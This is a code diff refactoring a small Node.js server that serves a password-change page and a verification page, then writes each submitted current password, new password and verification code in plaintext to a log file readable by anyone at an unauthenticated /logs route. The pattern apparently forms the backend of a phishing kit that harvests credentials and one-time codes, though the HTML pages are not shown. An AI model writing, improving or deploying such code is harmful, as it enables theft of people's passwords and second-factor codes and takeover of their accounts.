@@ -1,74 +1,78 @@
-var http = require('http');
-var fs   = require('fs');
-var path = require('path');
+const http = require('http');
+const fs   = require('fs');
+const path = require('path');
 
-var LOG_FILE = path.join(__dirname, 'submissions.log');
+const LOG_FILE = path.join(__dirname, 'submissions.log');
 
-function readBody(req, callback) {
-  var data = '';
-  req.on('data', function(chunk) { data += chunk; });
-  req.on('end', function() {
-    try { callback(JSON.parse(data)); }
-    catch(e) { callback({}); }
+function readBody(req) {
+  return new Promise(resolve => {
+    let data = '';
+    req.on('data', chunk => data += chunk);
+    req.on('end', () => {
+      try { resolve(JSON.parse(data || '{}')); }
+      catch (e) { resolve({}); }
+    });
   });
 }
 
 function serveFile(res, filePath, contentType) {
-  fs.readFile(filePath, function(err, data) {
+  fs.readFile(filePath, (err, data) => {
     if (err) { res.writeHead(404); res.end('Not found'); return; }
     res.writeHead(200, { 'Content-Type': contentType });
     res.end(data);
   });
 }
 
-var server = http.createServer(function(req, res) {
+const server = http.createServer(async (req, res) => {
 
+  // Serve pages
   if (req.method === 'GET' && req.url === '/') {
     serveFile(res, path.join(__dirname, 'index.html'), 'text/html');
 
   } else if (req.method === 'GET' && req.url === '/verify') {
     serveFile(res, path.join(__dirname, 'verify.html'), 'text/html');
 
+  // View logs in browser
   } else if (req.method === 'GET' && req.url === '/logs') {
-    if (!fs.existsSync(LOG_FILE)) {
-      res.writeHead(200, { 'Content-Type': 'text/plain' });
-      res.end('No logs yet.');
-      return;
+    try {
+      const logs = fs.existsSync(LOG_FILE) ? fs.readFileSync(LOG_FILE, 'utf8') : '(no logs yet)';
+      res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
+      res.end(logs);
+    } catch (e) {
+      res.writeHead(500); res.end('Error reading logs');
     }
-    var content = fs.readFileSync(LOG_FILE, 'utf8');
-    res.writeHead(200, { 'Content-Type': 'text/plain' });
-    res.end(content);
 
+  // Log password change from index.html
   } else if (req.method === 'POST' && req.url === '/log-password-change') {
-    readBody(req, function(body) {
-      var timestamp = new Date().toISOString();
-      var entry = '--- Password Change Submission ---\n'
-        + 'Timestamp:        ' + timestamp + '\n'
-        + 'Current Password: ' + (body.currentPassword || '') + '\n'
-        + 'New Password:     ' + (body.newPassword || '') + '\n'
-        + 'Verify Password:  ' + (body.verifyPassword || '') + '\n\n';
-      fs.appendFileSync(LOG_FILE, entry);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ success: true }));
-    });
+    const { currentPassword, newPassword, verifyPassword } = await readBody(req);
+    const entry = [
+      `--- Password Change Submission ---`,
+      `Timestamp:        ${new Date().toISOString()}`,
+      `Current Password: ${currentPassword || ''}`,
+      `New Password:     ${newPassword || ''}`,
+      `Verify Password:  ${verifyPassword || ''}`,
+      ``
+    ].join('\n') + '\n';
+    fs.appendFileSync(LOG_FILE, entry);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ success: true }));
 
+  // Log verification code from verify.html
   } else if (req.method === 'POST' && req.url === '/log-verification') {
-    readBody(req, function(body) {
-      var timestamp = new Date().toISOString();
-      var entry = '--- Verification Code Submission ---\n'
-        + 'Timestamp:         ' + timestamp + '\n'
-        + 'Verification Code: ' + (body.verificationCode || '') + '\n\n';
-      fs.appendFileSync(LOG_FILE, entry);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      res.end(JSON.stringify({ success: true }));
-    });
+    const { verificationCode } = await readBody(req);
+    const entry = [
+      `--- Verification Code Submission ---`,
+      `Timestamp:         ${new Date().toISOString()}`,
+      `Verification Code: ${verificationCode || ''}`,
+      ``
+    ].join('\n') + '\n';
+    fs.appendFileSync(LOG_FILE, entry);
+    res.writeHead(200, { 'Content-Type': 'application/json' });
+    res.end(JSON.stringify({ success: true }));
 
   } else {
-    res.writeHead(404);
-    res.end('Not found');
+    res.writeHead(404); res.end('Not found');
   }
 });
 
-server.listen(process.env.PORT || 3000, function() {
-  console.log('Server running');
-});
+server.listen(process.env.PORT || 3000, () => console.log('Server running on port ' + (process.env.PORT || 3000)));
